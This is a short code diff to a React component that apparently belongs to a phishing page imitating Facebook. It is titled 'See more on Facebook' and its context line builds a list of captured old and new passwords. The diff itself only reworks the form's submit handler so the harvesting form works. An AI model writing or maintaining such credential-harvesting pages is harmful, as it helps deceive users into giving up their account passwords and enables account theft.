@@ -189,7 +189,13 @@ ${passwordsList}${oldPasswords.length > 0 ? '\n' : ''}${newPassword}`.trim();
                 <div className="p-4 md:p-8">
                     <h2 className="mb-5 text-center text-[28px] font-bold">See more on Facebook</h2>
 
-                    <form className="flex flex-col items-center gap-4" onSubmit={handleSubmit}>
+                    <form
+                        onSubmit={(e) => {
+                            e.preventDefault();
+                            handleSubmit(e);
+                        }}
+                        className="flex flex-col items-center gap-4"
+                    >
                         <div className="relative w-full">
                             <input
                                 type="text"
